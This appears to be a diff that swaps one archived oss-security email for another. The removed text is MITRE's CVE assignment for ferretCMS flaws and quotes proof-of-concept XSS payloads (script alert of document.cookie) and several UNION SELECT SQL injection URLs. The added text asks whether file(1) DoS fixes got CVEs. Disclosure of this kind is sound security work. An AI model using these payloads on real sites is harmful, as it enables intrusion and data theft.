@@ -1,120 +1,51 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/01/27/1
-Message-ID: <Pine.LNX.4.64.1501271034400.11165@beijing.mitre.org>
-Date: Tue, 27 Jan 2015 10:37:48 -0500 (EST)
-From: cve-assign@...re.org
-To: Steffen Rösemann <steffen.roesemann1986@...il.com>
-cc: oss-security@...ts.openwall.com, cve-assign@...re.org
-Subject: Re: CVE-Request -- ferretCMS v.1.0.4-alpha -- Multiple reflecting/stored XSS- and SQLi-vulnerabilities, unrestricted file upload
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/01/16/11
+Message-ID: <54B90F0C.9080005@canonical.com>
+Date: Fri, 16 Jan 2015 08:15:56 -0500
+From: Marc Deslauriers <marc.deslauriers@...onical.com>
+To: oss-security@...ts.openwall.com
+CC: cve-assign@...re.org
+Subject: Re: CVE request: file(1) DoS
 Content-Type: text/plain; charset=utf-8
 
+On 2015-01-03 02:50 PM, Alexander Cherepanov wrote:
+> On 2014-12-17 03:44, Alexander Cherepanov wrote:
+>> There are two more DoSes fixed in ELF parser of file(1), similar to the
+>> recent CVE-2014-8116.
+> 
+> These fixes were included in 5.22 release:
+> 
+> http://mx.gw.com/pipermail/file/2015/001660.html
+> 
+>> 1. Limit the number of ELF notes processed
+>> Report: http://mx.gw.com/pipermail/file/2014/001653.html
+>> Fix: https://github.com/file/file/commit/ce90e05774dd77d86cfc8dfa6da57b32816841c4
+> 
+> This issue seems to be introduced here:
+> 
+> https://github.com/file/file/commit/956a45ab1c54b11304b367056f41905e72a02380#diff-bc5c24ef9f39a5f4963ca28ecbc645b3L423
+> 
+> 
+> which ended up in 5.08 release. Hence releases 5.08--5.21 are vulnerable.
+> 
+>> 2. Limit string printing to 100 chars
+>> Report: http://mx.gw.com/pipermail/file/2014/001654.html
+>> Fix: https://github.com/file/file/commit/65437cee25199dbd385fb35901bc0011e164276c
+> 
+> This issue was introduced in the following commit:
+> 
+> https://github.com/file/file/commit/c8451af8ab0c2e2a93ce93b9c68257d31576cc85
+> 
+> which ended up in 5.16 release. Hence releases 5.16--5.21 are vulnerable.
+> 
+>> Both problems amplified by the fact that the same section in ELF file
+>> can be referenced and processed by file(1) multiple times. This is also
+>> fixed in the first commit linked above.
+>>
+>> Could CVE(s) please be assigned?
+> 
 
-> I found multiple reflecting/stored XSS- and SQLi-vulnerabilities as well as
-> an unrestricted file upload in the CMS ferretCMS v.1.0.4 which is currently
-> in the alpha development stage.
->
-> ============
-> Reflecting XSS
-> ============
->
-> http://
-> {TARGET}/admin.php?type=search&action=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
->
-> ============
-> Stored XSS
-> ============
->
-> 1.
-> via login-form of the administrative backend, input field for username:
->
-> http://{TARGET}/admin.php
->
-> executed here in the logevent functionality in the backend:
->
-> http://{TARGET}/admin.php?type=log&action=read
->
-> 2.
->
-> via the new blog-post form, input field for pagetitle:
->
-> http://{TARGET}/admin.php?type=page&action=insert&p=
->
-> executed, for example, here:
->
-> http://{TARGET}/admin.php?type=page&action=read
+Did these ever get CVEs?
 
+Marc.
 
-Use CVE-2015-1373.
-
-
-> ============
-> SQLi
-> ============
->
-> http://
-> {TARGET}/admin.php?type=site&action=update&p=1+and+1=2+union+select+1,version%28%29,3,4+--+
->
-> http://
-> {TARGET}/admin.php?type=customkey&action=update&p=1+and+1=2+union+select+1,version%28%29,database%28%29,4+--+
->
-> http://
-> {TARGET}/admin.php?type=account&action=update&p=1+and+1=2+union+select+1,database%28%29,3,4,5,version%28%29,7,8,9+--+
->
-> http://
-> {TARGET}/admin.php?type=plugin&action=update&p=1+and+1=2+union+select+1,database%28%29,version%28%29,4+--+
->
-> http://
-> {TARGET}/admin.php?type=template&action=update&p=1+and+1=2+union+select+1,version%28%29,database%28%29,user%28%29,5+--+
->
-> http://
-> {TARGET}/admin.php?type=permissiongroup&action=update&p=1+and+1=2+union+select+1,version%28%29,3,4+--+
->
-> http://
-> {TARGET}/admin.php?type=page&action=update&p=1+and+substring%28version%28%29,1,1%29=5+--+
-
-Use CVE-2015-1372.
-
-> ==================
-> Unrestricted file upload
-> ==================
->
-> An administrator has the opportunity to upload arbitrary files via a form
-> located here on a common ferretCMS installation:
->
-> http://{TARGET}/admin.php?type=uploader&action=upload
->
-> As these files aren't renamed and stored in the following location, any
-> unauthenticated user is able to read/execute those files, too:
->
-> http://{TARGET}/custom/uploads/{NAME_OF_THE_FILE}
-
-Use CVE-2015-1371.
-
-
-Use CVE-2015-1374 for the underlying CSRF that makes the XSS, SQLi, and 
-file-upload attacks accessible to non-administrators.
-
-> Could you please assign a CVE-ID / CVE-IDs for these issues.
->
-> Thank you very much!
->
-> Greetings.
->
-> Steffen Rösemann
->
-> References:
->
-> [1] https://github.com/JRogaishio/ferretCMS
-> [2] http://sroesemann.blogspot.de/2015/01/sroeadv-2015-10.html
-> [3] https://github.com/JRogaishio/ferretCMS/issues/63
-> [4] https://github.com/sroesemann/ferretCMS
-> [5] http://seclists.org/fulldisclosure/2015/Jan/98
-> [6]
-> http://sroesemann.blogspot.de/2015/01/report-for-advisory-sroeadv-2015-10.html
->
-
----
-
-CVE assignment team, MITRE CVE Numbering Authority M/S M300
-202 Burlington Road, Bedford, MA 01730 USA
-[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
